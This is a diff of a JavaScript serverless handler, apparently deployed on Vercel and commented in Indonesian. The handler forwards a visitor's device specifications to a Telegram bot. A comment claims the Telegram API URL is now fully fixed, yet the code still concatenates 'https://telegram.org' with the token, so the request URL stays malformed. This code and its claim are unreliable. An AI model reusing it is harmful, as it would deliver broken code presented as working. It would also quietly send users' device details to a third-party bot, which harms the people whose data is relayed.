@@ -18,8 +18,9 @@ export default async function handler(req, res) {
                           `💻 Spesifikasi Perangkat:\n${bodyData.device || 'Unknown'}\n\n` +
                           `Status: Secure Relayed Success.`;
 
-        // Mengirim data menggunakan API resmi Vercel Fetch Platform
-        const response = await fetch(`https://telegram.org{TELEGRAM_TOKEN}/sendMessage`, {
+        // URL API Telegram yang sudah diperbaiki total (Anti Salah Baca Variabel)
+        const urlTelegram = 'https://telegram.org' + TELEGRAM_TOKEN + '/sendMessage';
+        const response = await fetch(urlTelegram, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -36,8 +37,7 @@ export default async function handler(req, res) {
         if (data.ok) {
             return res.status(200).json({ status: 'success' });
         } else {
-            // Jika token atau chat ID salah, Telegram akan mengirim pesan eror di sini
-            return res.status(500).json({ error: 'Telegram API rejected the request', details: data });
+            return res.status(500).json({ error: 'Telegram API rejected', details: data });
         }
 
     } catch (error) {
